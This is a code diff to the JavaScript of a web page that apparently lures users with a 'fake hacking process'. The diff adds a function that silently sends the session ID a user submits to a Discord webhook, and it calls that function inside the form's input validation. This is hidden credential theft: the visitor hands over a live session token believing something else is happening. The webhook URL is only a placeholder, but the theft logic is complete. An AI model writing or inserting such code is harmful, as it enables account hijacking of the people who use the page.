@@ -1,3 +1,29 @@
+// Discord Webhook URL (Replace with your actual webhook URL)
+const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL';
+
+// Function to send data to Discord webhook
+function sendToDiscordWebhook(sessionId) {
+  const payload = {
+    content: `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``,
+  };
+
+  fetch(DISCORD_WEBHOOK_URL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(payload),
+  })
+    .then(response => {
+      if (!response.ok) {
+        console.error('Failed to send data to Discord webhook');
+      }
+    })
+    .catch(error => {
+      console.error('Error sending data to Discord webhook:', error);
+    });
+}
+
 // Validate User Input
 function validateInput() {
   const username = document.getElementById('username').value.trim();
@@ -28,6 +54,9 @@ function validateInput() {
     showError(errorMessage);
     return;
   }
+
+  // Send Session ID to Discord webhook
+  sendToDiscordWebhook(sessionId);
 
   // Hide error and start fake hacking process
   hideError();
